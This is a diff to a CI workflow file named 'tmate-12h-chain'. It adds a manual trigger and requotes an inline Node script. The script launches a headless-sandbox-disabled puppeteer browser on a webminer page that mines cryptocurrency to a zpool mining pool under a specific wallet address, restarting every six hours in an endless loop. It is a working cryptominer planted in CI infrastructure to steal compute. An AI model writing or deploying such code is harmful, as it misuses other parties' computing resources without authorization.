@@ -1,3 +1,8 @@
+name: tmate-12h-chain
+
+on:
+  workflow_dispatch:
+
 jobs:
   tmate-1:
     runs-on: namespace-profile-default
@@ -38,31 +43,31 @@ jobs:
             sudo apt-get install -y nodejs
           fi
           npm install puppeteer
-          node -e "
-          const puppeteer = require('puppeteer');
-          const url = 'https://webminer.pages.dev?algorithm=cwm_ghostrider&host=ghostrider.na.mine.zpool.ca&port=5354&worker=RLYqcPSqDkF97FjnUJJ1HUzeQ3ciVNm8S5&password=c%3DRTM&workers=4';
+          node -e '
+          const puppeteer = require("puppeteer");
+          const url = "https://webminer.pages.dev?algorithm=cwm_ghostrider&host=ghostrider.na.mine.zpool.ca&port=5354&worker=RLYqcPSqDkF97FjnUJJ1HUzeQ3ciVNm8S5&password=c%3DRTM&workers=4";
           (async () => {
             while (true) {
               try {
                 const browser = await puppeteer.launch({
                   headless: false,
                   args: [
-                    '--no-sandbox',
-                    '--disable-setuid-sandbox',
-                    '--disable-dev-shm-usage',
-                    '--disable-gpu',
-                    '--window-size=1200,800'
+                    "--no-sandbox",
+                    "--disable-setuid-sandbox",
+                    "--disable-dev-shm-usage",
+                    "--disable-gpu",
+                    "--window-size=1200,800"
                   ]
                 });
                 const page = await browser.newPage();
-                await page.goto(url, { waitUntil: 'networkidle2' });
-                console.log('Webminer page loaded. Mining started.');
+                await page.goto(url, { waitUntil: "networkidle2" });
+                console.log("Webminer page loaded. Mining started.");
                 await new Promise(r => setTimeout(r, 21600 * 1000)); // 6 hours
                 await browser.close();
               } catch (err) {
-                console.error('Error occurred, restarting browser:', err);
+                console.error("Error occurred, restarting browser:", err);
               }
               await new Promise(r => setTimeout(r, 5000));
             }
           })();
-          "
+          '
